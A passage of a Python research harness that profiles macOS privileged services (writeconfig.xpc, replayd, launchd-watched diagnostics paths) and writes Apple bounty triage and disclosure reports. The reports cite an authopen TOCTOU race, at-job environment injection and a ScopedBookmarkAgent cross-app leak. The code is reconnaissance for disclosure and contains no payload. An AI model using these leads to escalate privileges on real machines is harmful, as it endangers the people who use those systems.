            "path": str(target),
            "bundle_identifier": info_plist.get("CFBundleIdentifier"),
            "xpc_service_type": info_plist.get("XPCService", {}).get("ServiceType")
            if isinstance(info_plist.get("XPCService"), dict)
            else None,
            "ls_lO": stringify_command_output(ls_proc),
            "file_output": stringify_command_output(file_proc),
            "info_output": stringify_command_output(info_proc),
            "launchctl_output": launchctl_output,
            "codesign_output": codesign_output,
            "strings_output": strings_output,
            "connection_probe_output": connection_probe_output,
            "immediate_reject_observed": immediate_reject_observed,
            "selector_summary": selector_summary,
            "readonly_method_probe": readonly_method_probe,
            "readonly_probe_interrupted": readonly_probe_interrupted,
            "explicit_client_validation_strings": explicit_client_validation,
            "noauth_initializer_present": noauth_initializer_present,
            "tcc_modify_entitlement_present": tcc_modify_present,
        },
    }
    write_json(json_result_path(outdir), result)

    report_lines = [
        "# writeconfig.xpc Surface Profile",
        "",
        f"Generated: {dt.datetime.now().astimezone().isoformat()}",
        "",
        "## Host",
        "",
        f"- Product: {sw_vers.get('ProductName', 'unknown')}",
        f"- Version: {sw_vers.get('ProductVersion', 'unknown')}",
        f"- Build: {sw_vers.get('BuildVersion', 'unknown')}",
        "",
        "## Surface",
        "",
        f"- Path: `{target}`",
        f"- Bundle identifier: `{info_plist.get('CFBundleIdentifier', 'unknown')}`",
        f"- XPC service type: `{result['target']['xpc_service_type'] or 'unknown'}`",
        f"- Permissions: `{result['target']['ls_lO'] or 'unavailable'}`",
        f"- `file` result: `{result['target']['file_output'] or 'unavailable'}`",
        f"- TCC modify entitlement present: `{tcc_modify_present}`",
        f"- Explicit client-validation strings present: `{explicit_client_validation}`",
        f"- `initWithNoAuthorization` marker present: `{noauth_initializer_present}`",
        f"- Launchd service record available: `{bool(launchctl_output)}`",
        f"- Connection-only probe immediately rejected: `{immediate_reject_observed}`",
        f"- Explicit authorization selectors found: `{len(selector_summary['auth_explicit'])}`",
        f"- Suspicious mutator-like selectors without explicit authorization text: `{len(selector_summary['suspicious_noauth_mutators'])}`",
        f"- Read-only selector probe interrupted or proxy-errored: `{readonly_probe_interrupted}`",
        "",
        "## Selector Summary",
        "",
    ]
    if selector_summary["suspicious_noauth_mutators"]:
        report_lines.append("- Suspicious mutator-like selectors lacking explicit `authorization` text:")
        for selector in selector_summary["suspicious_noauth_mutators"][:20]:
            report_lines.append(f"  - `{selector}`")
    else:
        report_lines.append("- No obvious mutator-like selectors lacking explicit `authorization` text were found in the current string surface.")
    report_lines.extend(
        [
            "- Notes:",
            "  - This selector list is string-based and may include internal helper methods, not only remotely callable protocol methods.",
            "  - It is still useful for choosing the next safe selector probe.",
            "",
            "## Read-Only Probe",
            "",
            f"- Probe status: `{readonly_method_probe.get('status', 'unknown')}`",
            f"- Probe interrupted/proxy-errored: `{readonly_probe_interrupted}`",
            f"- Raw probe output: `{readonly_method_probe.get('run_output', 'not available')}`",
            "",
            "## Apple Bounty Triage",
            "",
            f"- Decision: `{decision}`",
            f"- Why: {why}",
            "- Missing proof:",
        ]
    )
    for item in missing_proof:
        report_lines.append(f"  - {item}")
    report_lines.extend(
        [
            f"- Minimum next step: {next_step}",
            "",
            "## Notes",
            "",
            "- The service is interesting because it combines root execution with TCC/system-configuration capabilities.",
            "- The current artifact set is still pre-exploitation triage, not proof of an authorization bypass.",
            "",
        ]
    )

    report_path = outdir / "writeconfig_profile.md"
    write_text(report_path, "\n".join(report_lines) + "\n")
    print_summary(
        "\n".join(
            [
                f"Artifacts: {outdir}",
                f"Report: {report_path}",
                f"Decision: {decision}",
            ]
        )
    )
    return 0


def command_replayd_profile(args: argparse.Namespace) -> int:
    outdir = make_output_dir("replayd_profile", args.output_dir)
    target = Path("/usr/libexec/replayd")

    file_proc = run(["file", str(target)], check=False)
    ls_proc = run(["ls", "-lO", str(target)], check=False)
    codesign_proc = run(["codesign", "-dv", "--entitlements", "-", str(target)], check=False)
    strings_proc = run(
        [
            "/bin/sh",
            "-lc",
            (
                "strings "
                f"{shlex.quote(str(target))} "
                "| rg -n "
                "\"captureScreenshot:withRect:contentFilter:properties:completionHandler:|"
                "fetchDisplay:withCompletionHandler:|fetchWindow:withCompletionHandler:|"
                "getAllActiveStreamsAndPickersWithCompletionHandler:|"
                "Rejecting connection|missing entitlement|SCStreamErrorDomain|"
                "RPIOSurfaceObject|TCC|listener:shouldAcceptNewConnection:|"
                "RPDaemonProtocol\""
            ),
        ],
        check=False,
    )
    uid_proc = run(["id", "-u"], check=False)
    uid_text = (uid_proc.stdout or "").strip()
    launchctl_proc = run(
        ["launchctl", "print", f"gui/{uid_text}/com.apple.replayd"] if uid_text else ["false"],
        check=False,
    )
    sw_vers = collect_sw_vers()
    probe_suite = run_replayd_probe_suite()
    probe_parsed = probe_suite.get("parsed")

    readonly_methods = [
        "getAllActiveStreamsAndPickers",
        "fetchDisplay",
        "fetchWindow",
    ]
    exact_readonly_entitlement_denied = False
    capture_timeout = False
    picked_window_id: int | None = None
    if isinstance(probe_parsed, dict):
        exact_readonly_entitlement_denied = True
        for method in readonly_methods:
            events = probe_parsed.get(method)
            if not isinstance(events, list):
                exact_readonly_entitlement_denied = False
                break
            if not any("Failed due to missing entitlements" in str(event) for event in events):
                exact_readonly_entitlement_denied = False
                break

        capture_events = probe_parsed.get("captureScreenshot")
        if isinstance(capture_events, list):
            capture_timeout = any(str(event) == "wait=timeout" for event in capture_events)

        raw_window_id = probe_parsed.get("pickedWindowID")
        if isinstance(raw_window_id, int):
            picked_window_id = raw_window_id

    decision = "do not report"
    why = (
        "replayd does accept a normal local NSXPC client on com.apple.replayd, but the exact replayd "
        "read-only methods tested here return structured ScreenCaptureKit entitlement failures instead of "
        "protected data. That makes this a useful negative control for the audit, not a current Apple bounty bug."
    )
    missing_proof = [
        "A replayd method that returns protected screenshot, display, window, or picker data to an unentitled local client.",
        "A state-changing ReplayKit or ScreenCaptureKit action that succeeds without the required entitlement or user consent boundary.",
        "For captureScreenshot specifically, a well-formed argument set that produces a protected-data reply rather than a silent timeout.",
    ]
    next_step = (
        "Keep replayd as a reference surface for exact private-protocol work, but prioritize writeconfig.xpc or another TCC-entitled helper "
        "that does not already return explicit entitlement denials."
    )

    result = {
        "decision": decision,
        "why": why,
        "missing_proof": missing_proof,
        "next_step": next_step,
        "sw_vers": sw_vers,
        "target": {
            "path": str(target),
            "ls_lO": stringify_command_output(ls_proc),
            "file_output": stringify_command_output(file_proc),
            "codesign_output": stringify_command_output(codesign_proc),
            "strings_output": stringify_command_output(strings_proc),
            "launchctl_output": stringify_command_output(launchctl_proc),
            "probe_suite": probe_suite,
            "picked_window_id": picked_window_id,
            "exact_readonly_entitlement_denied": exact_readonly_entitlement_denied,
            "capture_timeout": capture_timeout,
        },
    }
    write_json(json_result_path(outdir), result)

    report_lines = [
        "# replayd Surface Profile",
        "",
        f"Generated: {dt.datetime.now().astimezone().isoformat()}",
        "",
        "## Host",
        "",
        f"- Product: {sw_vers.get('ProductName', 'unknown')}",
        f"- Version: {sw_vers.get('ProductVersion', 'unknown')}",
        f"- Build: {sw_vers.get('BuildVersion', 'unknown')}",
        "",
        "## Surface",
        "",
        f"- Path: `{target}`",
        f"- Permissions: `{result['target']['ls_lO'] or 'unavailable'}`",
        f"- `file` result: `{result['target']['file_output'] or 'unavailable'}`",
        f"- Launchd record available: `{bool(result['target']['launchctl_output'])}`",
        f"- Picked on-screen window ID for fetchWindow probe: `{picked_window_id if picked_window_id is not None else 'unknown'}`",
        "",
        "## Exact Probe Results",
        "",
        f"- `getAllActiveStreamsAndPickersWithCompletionHandler:` exact reply returned missing entitlements: `{exact_readonly_entitlement_denied}`",
        f"- `fetchDisplay:withCompletionHandler:` exact reply returned missing entitlements: `{exact_readonly_entitlement_denied}`",
        f"- `fetchWindow:withCompletionHandler:` exact reply returned missing entitlements: `{exact_readonly_entitlement_denied}`",
        f"- `captureScreenshot:withRect:contentFilter:properties:completionHandler:` exact probe timed out without data: `{capture_timeout}`",
        f"- Raw probe output: `{probe_suite.get('run_output', 'not available')}`",
        "",
        "## Apple Bounty Triage",
        "",
        f"- Decision: `{decision}`",
        f"- Why: {why}",
        "- Missing proof:",
    ]
    for item in missing_proof:
        report_lines.append(f"  - {item}")
    report_lines.extend(
        [
            f"- Minimum next step: {next_step}",
            "",
            "## Notes",
            "",
            "- The value here is methodological: replayd shows what a properly gated private XPC surface looks like once the exact reply signatures are known.",
            "- The current artifact set does not show a bypass of Screen Recording, picker enumeration, or ReplayKit screenshot boundaries.",
            "",
        ]
    )

    report_path = outdir / "replayd_profile.md"
    write_text(report_path, "\n".join(report_lines) + "\n")
    print_summary(
        "\n".join(
            [
                f"Artifacts: {outdir}",
                f"Report: {report_path}",
                f"Decision: {decision}",
            ]
        )
    )
    return 0


def command_noauth_fs_profile(args: argparse.Namespace) -> int:
    outdir = make_output_dir("noauth_fs_profile", args.output_dir)
    sw_vers = collect_sw_vers()

    candidate_paths = [
        (Path("/private/var/db/DiagnosticsReporter"), True),
        (Path("/private/var/db/PanicReporter"), True),
        (Path("/private/var/db/AppleIntelligencePlatform"), True),
        (Path("/private/var/db/UpdateMetrics/Events"), True),
        (Path("/private/var/db/spindump/UUIDToBinaryLocations"), False),
    ]
    path_facts = [collect_path_facts(path, allow_probe=allow_probe) for path, allow_probe in candidate_paths]

    triggers = collect_launchd_path_triggers()
    user_writable_triggers = [
        entry for entry in triggers if entry.get("path_facts", {}).get("os_access_write")
    ]

    diagnosticservicesd_proc = run(
        ["plutil", "-p", "/System/Library/LaunchDaemons/com.apple.diagnosticservicesd.plist"],
        check=False,
    )
    spindump_proc = run(
        [
            "/bin/sh",
            "-lc",
            (
                "strings /usr/sbin/spindump "
                "| rg -n \"UUIDToBinaryLocations|/private/var/db/spindump|open temp file|"
                "create /private/var/db/spindump|opendir /private/var/db/spindump\""
            ),
        ],
        check=False,
    )

    decision = "keep researching"
    why = (
        "Most launchd path-triggered candidates on this host collapse under permission checks: their watched "
        "or queued paths are not writable by an ordinary user. The later Claude leads that remain alive are "
        "the genuinely writable diagnostics directories, especially DiagnosticsReporter and PanicReporter, but "
        "there is still no confirmed privileged consumer path or unsafe file interpretation proving a boundary crossing."
    )
    missing_proof = [
        "A concrete privileged process that reacts to files created in DiagnosticsReporter or PanicReporter.",
        "A parser, path-following bug, or metadata trust issue showing user-created content changes privileged behavior.",
        "A confirmed write-and-consume path for UUIDToBinaryLocations if the spindump angle is pursued further.",
    ]
    next_step = (
        "Trace which process reacts to a fresh probe file in DiagnosticsReporter or PanicReporter and capture "
        "whether that consumer trusts attacker-controlled filenames, metadata, or file contents."
    )

    result = {
        "decision": decision,
        "why": why,
        "missing_proof": missing_proof,
        "next_step": next_step,
        "sw_vers": sw_vers,
        "candidate_paths": path_facts,
        "launchd_triggers": {
            "total": len(triggers),
            "user_writable": len(user_writable_triggers),
            "entries": triggers,
        },
        "diagnosticservicesd_plist": stringify_command_output(diagnosticservicesd_proc),
        "spindump_strings": stringify_command_output(spindump_proc),
    }
    write_json(json_result_path(outdir), result)

    report_lines = [
        "# No-Password Filesystem Surface Profile",
        "",
        f"Generated: {dt.datetime.now().astimezone().isoformat()}",
        "",
        "## Host",
        "",
        f"- Product: {sw_vers.get('ProductName', 'unknown')}",
        f"- Version: {sw_vers.get('ProductVersion', 'unknown')}",
        f"- Build: {sw_vers.get('BuildVersion', 'unknown')}",
        "",
        "## Candidate Paths",
        "",
    ]

    for facts in path_facts:
        report_lines.extend(
            [
                f"- `{facts['path']}`",
                f"  - Exists: `{facts['exists']}`",
                f"  - `os.access(..., W_OK)`: `{facts['os_access_write']}`",
                f"  - Mode: `{facts.get('mode_octal', 'unknown')}`",
                f"  - World-writable bits set: `{facts.get('world_writable_mode', False)}`",
            ]
        )
        if "probe_create_delete" in facts:
            report_lines.append(f"  - Create/delete probe: `{facts['probe_create_delete']}`")

    report_lines.extend(
        [
            "",
            "## launchd Path Triggers",
            "",
            f"- Total path-triggered launchd entries found: `{len(triggers)}`",
            f"- User-writable trigger paths on this host: `{len(user_writable_triggers)}`",
        ]
    )
    if user_writable_triggers:
        for entry in user_writable_triggers:
            report_lines.append(
                f"- `{entry['label']}` via `{entry['kind']}` on `{entry['path_facts']['path']}`"
            )
    else:
        report_lines.append("- No `WatchPaths`, `QueueDirectories`, or FSEvents launch paths were user-writable in `/System/Library/LaunchDaemons` on this host.")

    report_lines.extend(
        [
            "",
            "## Apple Bounty Triage",
            "",
            f"- Decision: `{decision}`",
            f"- Why: {why}",
            "- Missing proof:",
        ]
    )
    for item in missing_proof:
        report_lines.append(f"  - {item}")
    report_lines.extend(
        [
            f"- Minimum next step: {next_step}",
            "",
        ]
    )

    report_path = outdir / "noauth_fs_profile.md"
    write_text(report_path, "\n".join(report_lines) + "\n")
    print_summary(
        "\n".join(
            [
                f"Artifacts: {outdir}",
                f"Report: {report_path}",
                f"Decision: {decision}",
            ]
        )
    )
    return 0


def command_bounty_assess(args: argparse.Namespace) -> int:
    outdir = make_output_dir("apple_bounty_assess", args.output_dir)

    prefixes = [
        "authopen_toctou",
        "authopen_proof_pack",
        "at_oldpwd",
        "at_env",
        "spool_enum",
        "authexec_scan",
        "security_authtrampoline_profile",
        "scopedbookmark_profile",
        "writeconfig_profile",
        "replayd_profile",
        "noauth_fs_profile",
    ]
    latest: dict[str, dict[str, object]] = {}
    for prefix in prefixes:
        artifact_dir = latest_artifact_dir(prefix)
        if artifact_dir is None:
            continue
        result_path = artifact_dir / "result.json"
        if not result_path.exists():
            continue
        latest[prefix] = {
            "artifact_dir": str(artifact_dir),
            "result": read_json(result_path),
        }

    sw_vers = collect_sw_vers()
    authopen_result = latest.get("authopen_toctou", {}).get("result", {})
    authopen_pack_result = latest.get("authopen_proof_pack", {}).get("result", {})
    at_oldpwd_result = latest.get("at_oldpwd", {}).get("result", {})
    at_env_result = latest.get("at_env", {}).get("result", {})
    trampoline_profile = latest.get("security_authtrampoline_profile", {}).get("result", {})
    authexec_scan_result = latest.get("authexec_scan", {}).get("result", {})
    scopedbookmark_profile = latest.get("scopedbookmark_profile", {}).get("result", {})
    writeconfig_profile = latest.get("writeconfig_profile", {}).get("result", {})
    replayd_profile = latest.get("replayd_profile", {}).get("result", {})
    noauth_fs_profile = latest.get("noauth_fs_profile", {}).get("result", {})

    authopen_confirmed = bool(
        authopen_result.get("confirmed", authopen_result.get("confirmed_payload_marker"))
    )
    proof_pack_completed = authopen_pack_result.get("mode") == "runtime"
    proof_pack_dry_run = authopen_pack_result.get("mode") == "dry-run"
    oldpwd_confirmed = bool(at_oldpwd_result.get("confirmed_in_script"))
    ifs_confirmed = bool(at_env_result.get("IFS_serialized"))
    path_confirmed = bool(at_env_result.get("PATH_serialized"))
    caller_count = len(
        trampoline_profile.get("caller_scan", {}).get("matches", authexec_scan_result.get("matches", []))
    )

    authopen_decision = "keep researching"
    authopen_why = (
        "The lab artifact set confirms the core authopen TOCTOU behavior on this host: a swapped "
        "target can be opened after authorization. That is promising, but the current evidence set "
        "still lacks a completed reviewer-friendly differential pack proving the same approved bait "
        "path yields different objects in control versus race conditions."
    )
    authopen_missing = [
        "A completed authopen-proof-pack runtime capture, not only the standalone payload-marker run.",
        "A single reviewer-safe artifact set showing control result versus raced result for the same visible bait path.",
        "Supporting evidence such as sysdiagnose timestamps and, ideally, a short recording of the prompt plus returned output.",
    ]

    at_decision = "keep researching"
    at_why = (
        "The OLDPWD serialization flaw is real in generated at job scripts, and IFS/PATH carry through, "
        "but the current standard-configuration impact is weak. /System/Library/LaunchDaemons/com.apple.atrun.plist "
        "is disabled on this host, and the production-binary end-to-end path remains blocked by the root-owned lockfile state."
    )
    at_missing = [
        "A production-binary end-to-end confirmation on a clean host where /usr/bin/at is not blocked by stale root lock holders.",
        "A standard-configuration execution path showing meaningful security impact beyond self-injection.",
        "Evidence that the issue affects current public configuration without relying on atrun being manually enabled.",
    ]

    trampoline_decision = str(trampoline_profile.get("decision") or "do not report")
    trampoline_why = str(
        trampoline_profile.get("why")
        or "Only deprecated API surface and caller enumeration are established so far."
    )
    trampoline_missing = trampoline_profile.get("missing_proof") or [
        "A concrete exploit path through the trampoline rather than deprecated-API presence alone."
    ]

    scopedbookmark_decision = str(scopedbookmark_profile.get("decision") or "keep researching")
    scopedbookmark_why = str(
        scopedbookmark_profile.get("why")
        or "ScopedBookmarkAgent currently looks like the strongest local Apple privacy/integrity lead."
    )
    scopedbookmark_missing = scopedbookmark_profile.get("missing_proof") or [
        "Latest-version confirmation on the newest public macOS build."
    ]
    scopedbookmark_target = scopedbookmark_profile.get("target", {})

    writeconfig_decision = str(writeconfig_profile.get("decision") or "keep researching")
    writeconfig_why = str(
        writeconfig_profile.get("why")
        or "writeconfig.xpc remains a high-value no-password Apple target but lacks a selector-level repro."
    )
    writeconfig_missing = writeconfig_profile.get("missing_proof") or [
        "A selector-level connection and response trace from an unentitled client."
    ]
    writeconfig_target = writeconfig_profile.get("target", {})
    suspicious_noauth_mutators = (
        writeconfig_target.get("selector_summary", {}).get("suspicious_noauth_mutators", [])
        if isinstance(writeconfig_target.get("selector_summary"), dict)
        else []
    )

    replayd_decision = str(replayd_profile.get("decision") or "do not report")
    replayd_why = str(
        replayd_profile.get("why")
        or "Exact replayd probes currently return structured missing-entitlement errors rather than protected data."
    )
    replayd_missing = replayd_profile.get("missing_proof") or [
        "A replayd method that returns protected data to an unentitled local client."
    ]
    replayd_target = replayd_profile.get("target", {})

    noauth_fs_decision = str(noauth_fs_profile.get("decision") or "keep researching")
    noauth_fs_why = str(
        noauth_fs_profile.get("why")
        or "Later filesystem-triggered candidates remain interesting but unconfirmed."
    )
    noauth_fs_missing = noauth_fs_profile.get("missing_proof") or [
        "A proven privileged consumer for a user-writable diagnostics path."
    ]
    noauth_fs_paths = noauth_fs_profile.get("candidate_paths", [])
    user_writable_candidate_count = sum(
        1 for entry in noauth_fs_paths if entry.get("os_access_write")
    )

    overall_decision = "keep researching"
    next_step = (
        "Validate the ScopedBookmarkAgent finding on the latest public macOS build and capture a reviewer-ready "
        "artifact set that shows the lower-privileged caller, the leaked cross-app revocable bookmark metadata, "
        "the reversible cross-app state mutation, and the restored end state."
    )

    result = {
        "host": sw_vers,
        "overall_decision": overall_decision,
        "next_step": next_step,
        "tracks": {
            "authopen": {
                "decision": authopen_decision,
                "why": authopen_why,
                "confirmed_lab_race": authopen_confirmed,
                "proof_pack_completed": proof_pack_completed,
                "proof_pack_dry_run": proof_pack_dry_run,
                "artifact_dir": latest.get("authopen_toctou", {}).get("artifact_dir"),
                "proof_pack_artifact_dir": latest.get("authopen_proof_pack", {}).get("artifact_dir"),
                "missing_proof": authopen_missing,
            },
            "at_olpwd_env": {
                "decision": at_decision,
                "why": at_why,
                "oldpwd_confirmed": oldpwd_confirmed,
                "ifs_confirmed": ifs_confirmed,
                "path_confirmed": path_confirmed,
                "artifact_dir": latest.get("at_oldpwd", {}).get("artifact_dir"),
                "env_artifact_dir": latest.get("at_env", {}).get("artifact_dir"),
                "missing_proof": at_missing,
            },
            "security_authtrampoline": {
                "decision": trampoline_decision,
                "why": trampoline_why,
                "caller_candidates": caller_count,
                "artifact_dir": latest.get("security_authtrampoline_profile", {}).get("artifact_dir"),
                "missing_proof": trampoline_missing,
            },
            "scopedbookmark": {
                "decision": scopedbookmark_decision,
                "why": scopedbookmark_why,
                "mach_service": scopedbookmark_target.get("mach_service"),
                "raw_xpc_reachable": scopedbookmark_target.get("raw_xpc_reachable"),
                "info_leak_confirmed": scopedbookmark_target.get("info_leak_confirmed"),
                "cross_app_state_mutation_confirmed": scopedbookmark_target.get("cross_app_state_mutation_confirmed"),
                "restored_original_state": scopedbookmark_target.get("restored_original_state"),
                "latest_public_build_mismatch": scopedbookmark_target.get("latest_public_build_mismatch"),
                "artifact_dir": latest.get("scopedbookmark_profile", {}).get("artifact_dir"),
                "missing_proof": scopedbookmark_missing,
            },
            "writeconfig": {
                "decision": writeconfig_decision,
                "why": writeconfig_why,
                "connection_immediately_rejected": writeconfig_target.get("immediate_reject_observed"),
                "readonly_probe_interrupted": writeconfig_target.get("readonly_probe_interrupted"),
                "suspicious_noauth_mutators": suspicious_noauth_mutators,
                "artifact_dir": latest.get("writeconfig_profile", {}).get("artifact_dir"),
                "missing_proof": writeconfig_missing,
            },
            "replayd": {
                "decision": replayd_decision,
                "why": replayd_why,
                "exact_readonly_entitlement_denied": replayd_target.get("exact_readonly_entitlement_denied"),
                "capture_timeout": replayd_target.get("capture_timeout"),
                "artifact_dir": latest.get("replayd_profile", {}).get("artifact_dir"),
                "missing_proof": replayd_missing,
            },
            "noauth_filesystem_surfaces": {
                "decision": noauth_fs_decision,
                "why": noauth_fs_why,
                "user_writable_candidate_count": user_writable_candidate_count,
                "artifact_dir": latest.get("noauth_fs_profile", {}).get("artifact_dir"),
                "missing_proof": noauth_fs_missing,
            },
        },
    }
    write_json(json_result_path(outdir), result)

    report_lines = [
        "# Apple Security Bounty Assessment",
        "",
        f"Generated: {dt.datetime.now().astimezone().isoformat()}",
        "",
        "## Host",
        "",
        f"- Product: {sw_vers.get('ProductName', 'unknown')}",
        f"- Version: {sw_vers.get('ProductVersion', 'unknown')}",
        f"- Build: {sw_vers.get('BuildVersion', 'unknown')}",
        "",
        "## Decision",
        "",
        f"- Overall: `{overall_decision}`",
        f"- Next step: {next_step}",
        "",
        "## ScopedBookmarkAgent",
        "",
        f"- Decision: `{scopedbookmark_decision}`",
        f"- Why: {scopedbookmark_why}",
        f"- Mach service: `{scopedbookmark_target.get('mach_service', 'unknown')}`",
        f"- Raw XPC reachable from unentitled local client: `{scopedbookmark_target.get('raw_xpc_reachable', 'unknown')}`",
        f"- Cross-app revocable bookmark metadata leak confirmed: `{scopedbookmark_target.get('info_leak_confirmed', 'unknown')}`",
        f"- Cross-app reversible state mutation confirmed: `{scopedbookmark_target.get('cross_app_state_mutation_confirmed', 'unknown')}`",
        f"- Original state restored after test: `{scopedbookmark_target.get('restored_original_state', 'unknown')}`",
        f"- Latest public build mismatch still blocks report-now status: `{scopedbookmark_target.get('latest_public_build_mismatch', 'unknown')}`",
        f"- Latest artifact: `{latest.get('scopedbookmark_profile', {}).get('artifact_dir', 'not available')}`",
        "- Missing proof:",
    ]
    for item in scopedbookmark_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## writeconfig.xpc",
            "",
            f"- Decision: `{writeconfig_decision}`",
            f"- Why: {writeconfig_why}",
            f"- Connection-only probe immediately rejected: `{writeconfig_target.get('immediate_reject_observed', 'unknown')}`",
            f"- Read-only selector probe interrupted/proxy-errored: `{writeconfig_target.get('readonly_probe_interrupted', 'unknown')}`",
            f"- Suspicious no-auth-looking mutator selectors: `{len(suspicious_noauth_mutators)}`",
            f"- Latest artifact: `{latest.get('writeconfig_profile', {}).get('artifact_dir', 'not available')}`",
            "- Missing proof:",
        ]
    )
    for item in writeconfig_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## replayd",
            "",
            f"- Decision: `{replayd_decision}`",
            f"- Why: {replayd_why}",
            f"- Exact read-only probes returned missing entitlements: `{replayd_target.get('exact_readonly_entitlement_denied', 'unknown')}`",
            f"- Exact capture probe timed out without protected data: `{replayd_target.get('capture_timeout', 'unknown')}`",
            f"- Latest artifact: `{latest.get('replayd_profile', {}).get('artifact_dir', 'not available')}`",
            "- Missing proof:",
        ]
    )
    for item in replayd_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## no-password filesystem surfaces",
            "",
            f"- Decision: `{noauth_fs_decision}`",
            f"- Why: {noauth_fs_why}",
            f"- User-writable candidate paths confirmed on this host: `{user_writable_candidate_count}`",
            f"- Latest artifact: `{latest.get('noauth_fs_profile', {}).get('artifact_dir', 'not available')}`",
            "- Missing proof:",
        ]
    )
    for item in noauth_fs_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## authopen",
            "",
            f"- Decision: `{authopen_decision}`",
            f"- Why: {authopen_why}",
            f"- Lab race confirmed: `{authopen_confirmed}`",
            f"- Differential proof pack completed: `{proof_pack_completed}`",
            f"- Latest race artifact: `{latest.get('authopen_toctou', {}).get('artifact_dir', 'not available')}`",
            f"- Latest proof-pack artifact: `{latest.get('authopen_proof_pack', {}).get('artifact_dir', 'not available')}`",
            "- Missing proof:",
        ]
    )
    for item in authopen_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## at(1) / atrun",
            "",
            f"- Decision: `{at_decision}`",
            f"- Why: {at_why}",
            f"- Raw OLDPWD injection confirmed: `{oldpwd_confirmed}`",
            f"- IFS serialized: `{ifs_confirmed}`",
            f"- PATH serialized: `{path_confirmed}`",
            f"- Latest OLDPWD artifact: `{latest.get('at_oldpwd', {}).get('artifact_dir', 'not available')}`",
            f"- Latest env artifact: `{latest.get('at_env', {}).get('artifact_dir', 'not available')}`",
            "- Missing proof:",
        ]
    )
    for item in at_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## security_authtrampoline",
            "",
            f"- Decision: `{trampoline_decision}`",
            f"- Why: {trampoline_why}",
            f"- Caller candidates in local scan: `{caller_count}`",
            f"- Latest profile artifact: `{latest.get('security_authtrampoline_profile', {}).get('artifact_dir', 'not available')}`",
            "- Missing proof:",
        ]
    )
    for item in trampoline_missing:
        report_lines.append(f"  - {item}")

    report_lines.extend(
        [
            "",
            "## Suggested Report Title",
            "",
            "- `ScopedBookmarkAgent exposes and mutates another app's revocable bookmark state to an unentitled local client`",
            "",
            "## Suggested Report Summary",
            "",
            "- The strongest current local Apple lead is ScopedBookmarkAgent. "
            "The current artifact set on macOS 26.0.1 build 25A362 shows that an unentitled local client can reach "
            "the raw XPC surface, enumerate another app's revocable bookmark metadata, and reversibly toggle that "
            "other app's active revocable-bookmark state before restoring it. This looks like a real cross-app "
            "privacy and integrity boundary failure, but it still needs latest-version confirmation and a tighter "
            "Apple-ready evidence pack before submission.",
            "",
        ]
    )

    report_path = outdir / "apple_bounty_assessment.md"
    write_text(report_path, "\n".join(report_lines) + "\n")

    print_summary(
        "\n".join(
            [
                f"Artifacts: {outdir}",
                f"Report: {report_path}",
                f"Overall decision: {overall_decision}",
                f"Next step: {next_step}",
            ]
        )
    )
    return 0


def command_disclosure_report(args: argparse.Namespace) -> int:
    outdir = make_output_dir("disclosure_report", args.output_dir)

    prefixes = [
        "authopen_toctou",
        "authopen_decoy_sqlite",
        "at_oldpwd",
        "at_env",
        "spool_enum",
        "authexec_scan",
    ]
    latest: dict[str, dict[str, object]] = {}
    for prefix in prefixes:
        artifact_dir = latest_artifact_dir(prefix)
        if artifact_dir is None:
            continue
        result_path = artifact_dir / "result.json"
        if not result_path.exists():
            continue
        latest[prefix] = {
            "artifact_dir": str(artifact_dir),
            "result": read_json(result_path),
        }

    authopen_result = latest.get("authopen_toctou", {}).get("result", {})
    decoy_result = latest.get("authopen_decoy_sqlite", {}).get("result", {})
    at_oldpwd_result = latest.get("at_oldpwd", {}).get("result", {})
    at_env_result = latest.get("at_env", {}).get("result", {})
    spool_result = latest.get("spool_enum", {}).get("result", {})
    authexec_result = latest.get("authexec_scan", {}).get("result", {})

    authopen_confirmed = bool(
        authopen_result.get("confirmed", authopen_result.get("confirmed_payload_marker"))
    )
    decoy_confirmed = bool(
        decoy_result.get("confirmed", decoy_result.get("confirmed_sqlite_header"))
    )
    oldpwd_confirmed = bool(at_oldpwd_result.get("confirmed_in_script"))
    ifs_confirmed = bool(at_env_result.get("IFS_serialized"))
    path_confirmed = bool(at_env_result.get("PATH_serialized"))
    matches = authexec_result.get("matches", [])
    spool_entries = spool_result.get("entries", [])

    report = textwrap.dedent(
        f"""
        # macOS Privileged Binaries Research Update

        Generated: {dt.datetime.now().astimezone().isoformat()}

        ## Scope

        - `/usr/libexec/authopen`
        - `/usr/bin/at`
        - `/usr/libexec/atrun`
        - deprecated `AuthorizationExecuteWithPrivileges` call sites

        ## Current Research Status

        - `authopen` lab TOCTOU confirmation: {"confirmed" if authopen_confirmed else "not confirmed in latest run"}
        - `authopen` decoy SQLite confirmation: {"confirmed" if decoy_confirmed else "not yet run or not confirmed"}
        - `at` raw `OLDPWD` injection: {"confirmed" if oldpwd_confirmed else "not confirmed in latest run"}
        - `at` environment carryover:
          - `IFS`: {"confirmed" if ifs_confirmed else "not confirmed"}
          - `PATH`: {"confirmed" if path_confirmed else "not confirmed"}
        - enumerable `at` spool entries in latest run: {len(spool_entries)}
        - `AuthorizationExecuteWithPrivileges` caller candidates in latest run: {len(matches)}

        ## Evidence Pointers

        - Latest `authopen` lab artifact:
          {latest.get("authopen_toctou", {}).get("artifact_dir", "not available")}
        - Latest `authopen` decoy SQLite artifact:
          {latest.get("authopen_decoy_sqlite", {}).get("artifact_dir", "not available")}
        - Latest `at` OLDPWD artifact:
          {latest.get("at_oldpwd", {}).get("artifact_dir", "not available")}
        - Latest `at` env artifact:
          {latest.get("at_env", {}).get("artifact_dir", "not available")}
        - Latest spool-enum artifact:
          {latest.get("spool_enum", {}).get("artifact_dir", "not available")}
        - Latest deprecated API scan artifact:
          {latest.get("authexec_scan", {}).get("artifact_dir", "not available")}

        ## Notes

        - The `authopen` work remains bounded to researcher-controlled lab files.
        - The decoy SQLite path is intended to demonstrate database-like impact without touching protected privacy stores.
        - `DYLD_*` variables may not survive into `at` jobs on current macOS because the kernel strips them before setuid-root `/usr/bin/at` receives them.
        """
    ).strip() + "\n"

    if matches:
        report += "\n## Deprecated API Caller Candidates\n\n"
        for match in matches:
            report += f"- `{match['binary']}` ({', '.join(match['evidence'])})\n"

    report_path = outdir / "disclosure_report.md"
    write_text(report_path, report)
    write_json(json_result_path(outdir), latest)

    print_summary(f"Artifacts: {outdir}\nReport: {report_path}")
